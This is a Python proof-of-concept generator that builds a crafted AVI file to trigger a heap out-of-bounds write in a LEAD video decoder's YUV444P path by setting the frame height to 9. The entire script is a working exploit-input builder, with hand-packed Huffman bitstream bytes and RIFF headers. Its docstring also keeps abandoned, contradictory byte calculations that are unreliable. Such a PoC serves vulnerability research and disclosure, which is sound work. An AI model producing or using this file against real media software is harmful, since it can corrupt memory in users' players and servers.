#!/usr/bin/env python3
"""
PoC generator for VULN-001: lead_decode_frame YUV444P heap OOB write
via unchecked height alignment.

The LEAD decoder's YUV444P path (format=0x2000) iterates
  j in range(ceil(height/8))
and each iteration calls idct_put() writing 8 rows starting at row 8*j.
With height=9, j=1 writes rows 8-15 into a buffer that only has 9 rows,
causing 7 rows of heap OOB write.

Canonical Huffman codes derived from leaddata.h + jpegtabs.h:
  Luma DC  category 0 → "00"   (2 bits)   [luma_dc_len[0]=2]
  Luma AC  EOB (0x00)  → "1010" (4 bits)  [luma_ac_len[3]=4, ff_mjpeg_val_ac_luminance[3]=0x00]
  Chroma DC category 0 → "00"  (2 bits)   [chroma_dc_len[0]=2]
  Chroma AC EOB (0x00) → "00"  (2 bits)   [chroma_ac_len[0]=2, ff_mjpeg_val_ac_chrominance[0]=0x00]

Per (j,i) group of 3 planes (plane 0=luma, 1,2=chroma):
  plane 0: DC "00" + AC "1010" = 6 bits
  plane 1: DC "00" + AC "00"   = 4 bits
  plane 2: DC "00" + AC "00"   = 4 bits
  total:                          14 bits

Loop: f=0, j in {0,1}, i in {0,1}  →  4 groups × 14 bits = 56 bits

56-bit stream packed MSB-first:
  Grp1(j=0,i=0): 001010 0000 0000
  Grp2(j=0,i=1): 001010 0000 0000
  Grp3(j=1,i=0): 001010 0000 0000   ← dst = frame row 8; idct_put writes rows 8-15 → OOB
  Grp4(j=1,i=1): 001010 0000 0000   ← same OOB

Bit string (56 bits):
  00101000 00000010 10000000 00001010 00000000 10100000 00000000
  = 0x28     0x02     0x80     0x0A     0x00     0xA0     0x00

Wait – let me recompute carefully by packing left to right:

Positions 0-5:   001010  (grp1 luma DC=00 + AC-EOB=1010)
Positions 6-9:   0000    (grp1 chroma1 DC=00 + AC-EOB=00)
Positions 10-13: 0000    (grp1 chroma2 DC=00 + AC-EOB=00)
Positions 14-19: 001010  (grp2 luma)
Positions 20-23: 0000    (grp2 chroma1)
Positions 24-27: 0000    (grp2 chroma2)
Positions 28-33: 001010  (grp3 luma)
Positions 34-37: 0000    (grp3 chroma1)
Positions 38-41: 0000    (grp3 chroma2)
Positions 42-47: 001010  (grp4 luma)
Positions 48-51: 0000    (grp4 chroma1)
Positions 52-55: 0000    (grp4 chroma2)
Positions 56-63: 00000000 (padding)

Byte 0  bits 0-7:  00101000 = 0x28
Byte 1  bits 8-15: 00000001 = 0x01  <-- wrong, let me redo

Bit layout byte by byte:
  bit 0: 0   \
  bit 1: 0    > grp1 luma DC "00"
  bit 2: 1   \
  bit 3: 0    |
  bit 4: 1    > grp1 luma AC "1010"
  bit 5: 0   /
  bit 6: 0   \
  bit 7: 0    > grp1 ch1 DC "00" (first 2 bits in byte, last 2 in next)
  ---- byte 0: 00101000 = 0x28 ----
  bit 8: 0   /  (end of grp1 ch1 DC)
  bit 9: 0   > grp1 ch1 AC "00"
  bit10: 0   \
  bit11: 0    > grp1 ch2 DC "00"
  bit12: 0   \
  bit13: 0    > grp1 ch2 AC "00"
  bit14: 0   \
  bit15: 0    > grp2 luma DC "00" (first 2 bits)
  ---- byte 1: 00000000 = 0x00 ----
  bit16: 1   \
  bit17: 0    |
  bit18: 1    > grp2 luma AC "1010"
  bit19: 0   /
  bit20: 0   \
  bit21: 0    > grp2 ch1 DC "00"
  bit22: 0   \
  bit23: 0    > grp2 ch1 AC "00"
  ---- byte 2: 10100000 = 0xA0 ----
  bit24: 0   \
  bit25: 0    > grp2 ch2 DC "00"
  bit26: 0   \
  bit27: 0    > grp2 ch2 AC "00"
  bit28: 0   \
  bit29: 0    > grp3 luma DC "00"
  bit30: 1   \
  bit31: 0    > grp3 luma AC "10" (first 2 bits)
  ---- byte 3: 00000010 = 0x02 ----
  bit32: 1   \
  bit33: 0    > grp3 luma AC "10" (last 2 bits) → full code "1010"
  bit34: 0   \
  bit35: 0    > grp3 ch1 DC "00"
  bit36: 0   \
  bit37: 0    > grp3 ch1 AC "00"
  bit38: 0   \
  bit39: 0    > grp3 ch2 DC "00"
  ---- byte 4: 10000000 = 0x80 ----
  bit40: 0   \
  bit41: 0    > grp3 ch2 AC "00"
  bit42: 0   \
  bit43: 0    > grp4 luma DC "00"
  bit44: 1   \
  bit45: 0    |
  bit46: 1    > grp4 luma AC "1010"
  bit47: 0   /
  ---- byte 5: 00001010 = 0x0A ----
  bit48: 0   \
  bit49: 0    > grp4 ch1 DC "00"
  bit50: 0   \
  bit51: 0    > grp4 ch1 AC "00"
  bit52: 0   \
  bit53: 0    > grp4 ch2 DC "00"
  bit54: 0   \
  bit55: 0    > grp4 ch2 AC "00"
  ---- byte 6: 00000000 = 0x00 ----

Bitstream bytes:  0x28 0x00 0xA0 0x02 0x80 0x0A 0x00
XOR'd (AVI raw):  0xA8 0x80 0x20 0x82 0x00 0x8A 0x80

Verification – no AVI byte produces src=0xFF after XOR, so no skip-pair fires.
"""

import struct
import os

WIDTH  = 16
HEIGHT = 9   # NOT a multiple of 8 → triggers OOB on j=1

def chunk(fourcc: str, data: bytes) -> bytes:
    """Build a RIFF chunk: fourcc(4) + size(4, LE) + data [+ 0x00 pad if odd]."""
    raw = fourcc.encode('latin-1') + struct.pack('<I', len(data)) + data
    if len(data) % 2:
        raw += b'\x00'
    return raw

def list_chunk(list_type: str, data: bytes) -> bytes:
    """Build a LIST chunk."""
    return chunk('LIST', list_type.encode('latin-1') + data)

# ── 1. Craft LEAD frame bitstream ─────────────────────────────────────────
#
# The decoder XORs every byte with 0x80 before feeding into GetBitContext.
# To get desired bitstream byte B in the decoder, put (B ^ 0x80) in the AVI.
#
# Desired bitstream (56 bits = 7 bytes, padded to 16 for safety):
#   0x28 0x00 0xA0 0x02 0x80 0x0A 0x00  <-- actual decoded bits
#
# AVI payload bytes (XOR each with 0x80):
#   0xA8 0x80 0x20 0x82 0x00 0x8A 0x80

BITSTREAM_BYTES = bytes([0x28, 0x00, 0xA0, 0x02, 0x80, 0x0A, 0x00])

# Convert to AVI raw bytes (XOR with 0x80)
# Also verify none produce src=0xFF (which would cause skip-pair in the loop)
avi_payload_bytes = bytearray()
for b in BITSTREAM_BYTES:
    avi_b = b ^ 0x80
    src = avi_b ^ 0x80   # what the decoder sees
    assert src != 0xFF, f"byte {b:#04x} would produce src=0xFF, triggering skip logic"
    avi_payload_bytes.append(avi_b)

# Add safe padding (0x80 → src=0x00, no skip risk) to exceed size check margin
avi_payload_bytes += bytes([0x80] * 16)

# Frame header (8 bytes):
#   bytes 0-3: zeroes (unused by decoder)
#   bytes 4-5: format = 0x2000 (YUV444P)  [RL16]
#   bytes 6-7: quality = 50                [RL16]
frame_header = bytes([0x00, 0x00, 0x00, 0x00,   # unused
                      0x00, 0x20,                # format = 0x2000
                      0x32, 0x00])               # q = 50

frame_data = frame_header + bytes(avi_payload_bytes)
# Total: 8 + 7 + 16 = 31 bytes
# Size check: (31-8)*8 = 184 bits  >=  ceil(16/8)*ceil(9/8)*3*4 = 48 bits  ✓

assert len(frame_data) >= 15  # minimum for 56-bit bitstream
# Verify size check formula
mb_size_log2 = 3   # 4 - 1 for YUV444P
import math
need = math.ceil(WIDTH / 2**mb_size_log2) * math.ceil(HEIGHT / 2**mb_size_log2) * 3 * 4
have = (len(frame_data) - 8) * 8
assert have >= need, f"size check would fail: have {have} bits, need {need}"

# ── 2. BITMAPINFOHEADER + 20 bytes extra (extradata_size must be >= 20) ──
BI_SIZE = 40 + 20   # biSize = 60 → FFmpeg AVI demuxer passes 20 extra bytes as extradata
bitmapinfo  = struct.pack('<I',  BI_SIZE)
bitmapinfo += struct.pack('<i',  WIDTH)
bitmapinfo += struct.pack('<i',  HEIGHT)
bitmapinfo += struct.pack('<H',  1)                  # biPlanes
bitmapinfo += struct.pack('<H',  24)                 # biBitCount
bitmapinfo += b'LEAD'                                # biCompression
bitmapinfo += struct.pack('<I',  WIDTH * HEIGHT * 3) # biSizeImage
bitmapinfo += struct.pack('<i',  0)                  # biXPelsPerMeter
bitmapinfo += struct.pack('<i',  0)                  # biYPelsPerMeter
bitmapinfo += struct.pack('<I',  0)                  # biClrUsed
bitmapinfo += struct.pack('<I',  0)                  # biClrImportant
bitmapinfo += bytes(20)                              # extradata (20 bytes of zeroes)
assert len(bitmapinfo) == 60

# ── 3. AVIMAINHEADER (56 bytes) ───────────────────────────────────────────
avih = struct.pack('<IIIIIIIIII',
    33333,                      # dwMicroSecPerFrame  (~30 fps)
    len(frame_data) * 30,       # dwMaxBytesPerSec
    0,                          # dwPaddingGranularity
    0x00000010,                 # dwFlags (AVIF_HASINDEX)
    1,                          # dwTotalFrames
    0,                          # dwInitialFrames
    1,                          # dwStreams
    len(frame_data) + 8,        # dwSuggestedBufferSize
    WIDTH,                      # dwWidth
    HEIGHT,                     # dwHeight
)
avih += bytes(16)               # reserved
assert len(avih) == 56

# ── 4. AVISTREAMHEADER (56 bytes) ─────────────────────────────────────────
strh  = b'vids' + b'LEAD'
strh += struct.pack('<I', 0)                    # dwFlags
strh += struct.pack('<H', 0)                    # wPriority
strh += struct.pack('<H', 0)                    # wLanguage
strh += struct.pack('<I', 0)                    # dwInitialFrames
strh += struct.pack('<I', 1)                    # dwScale
strh += struct.pack('<I', 30)                   # dwRate  (30 fps)
strh += struct.pack('<I', 0)                    # dwStart
strh += struct.pack('<I', 1)                    # dwLength (1 frame)
strh += struct.pack('<I', len(frame_data) + 8)  # dwSuggestedBufferSize
strh += struct.pack('<I', 0xFFFFFFFF)           # dwQuality (-1)
strh += struct.pack('<I', 0)                    # dwSampleSize
strh += struct.pack('<hhhh', 0, 0, WIDTH, HEIGHT)  # rcFrame
assert len(strh) == 56

# ── 5. Assemble AVI RIFF structure ───────────────────────────────────────
strl = list_chunk('strl', chunk('strh', strh) + chunk('strf', bitmapinfo))
hdrl = list_chunk('hdrl', chunk('avih', avih) + strl)

frame_chunk = chunk('00dc', frame_data)

# movi LIST: 'movi' tag + frame chunk
# idx1 dwOffset convention: offset from start of movi LIST payload (i.e., from 'movi' tag)
# Frame chunk starts 4 bytes in (after 'movi' tag)
movi = chunk('LIST', b'movi' + frame_chunk)

AVIIF_KEYFRAME = 0x00000010
idx1_entry = b'00dc' + struct.pack('<III', AVIIF_KEYFRAME, 4, len(frame_data))
idx1 = chunk('idx1', idx1_entry)

riff_payload = b'AVI ' + hdrl + movi + idx1
avi_file = chunk('RIFF', riff_payload)

out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                        'vuln_001_input.avi')
with open(out_path, 'wb') as f:
    f.write(avi_file)

print(f"Written {len(avi_file)} bytes → {out_path}")
print(f"Frame data size: {len(frame_data)} bytes  (size check: {have} >= {need} bits OK)")
print(f"  header[4:6] = 0x{int.from_bytes(frame_header[4:6], 'little'):04X}  (expect 0x2000=YUV444P)")
print(f"  header[6:8] = {int.from_bytes(frame_header[6:8], 'little')}  (quality q)")
print(f"  payload bytes (hex): {avi_payload_bytes.hex()}")
print()
print("Expected OOB write when j=1 blocks are decoded:")
print("  frame buffer has 9 rows; idct_put at row 8 writes rows 8-15 → 7 rows OOB")
